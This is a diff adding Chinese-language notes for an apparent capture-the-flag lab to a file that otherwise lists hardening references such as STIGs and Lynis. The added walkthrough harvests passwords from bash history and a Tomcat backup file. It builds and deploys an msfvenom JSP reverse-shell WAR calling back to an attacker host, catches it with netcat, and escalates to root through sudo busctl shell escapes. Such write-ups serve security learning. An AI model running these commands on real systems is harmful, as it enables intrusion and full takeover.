@@ -348,3 +348,40 @@ DISA 的安全技术实施指南 (STIGs)
 许多合规框架，如 ISO27001、PCI-DSS 和 HIPAA
 用于审计基于 Unix 的系统（Linux、macOS、BDS 等）的有用工具 Lynis
   https://github.com/CISOfy/lynis
+
+
+
+————————————————————————————————————
+ls -lA               找隐藏文件夹 .config/
+ls -lA .config/      找隐藏文件 .flag1.txt
+cat .config/.flag1.txt
+
+
+cat /home/barry/.bash_history      看 bash 历史，找到用户 barry 的密码
+su barry                           用 su 登录
+cat /home/barry/flag2.txt
+
+
+id      看 barry 组信息，发现 4(adm)，可以看 /var/log/
+cat /var/log/flag3.txt
+
+
+netstat -tulpn | grep LISTEN      查看监听端口
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=PWNIP LPORT=PWNPO -f war -o managerUpdated.war
+cat /etc/tomcat9/tomcat-users.xml.bak | grep "password"      找密码
+用浏览器登录 http://STMIP:8080/
+deploy managerUpdated.war
+nc nc -nvlp PWNPO
+cat /var/lib/tomcat9/flag4.txt
+
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'      用 python 升级交互 shell
+sudo -l      发现 (root) NOPASSWD: /usr/bin/busctl
+  https://gtfobins.org/gtfobins/busctl/
+busctl --show-machine      用于列出 systemd 管理的 容器/虚拟机 信息，输出内容会调用默认的分页程序，通常是 less
+!/bin/sh                   less 支持执行 shell 命令，输入 ! 后跟命令
+  或者直接拿 shell
+  busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
+cat /root/flag5.txt
+
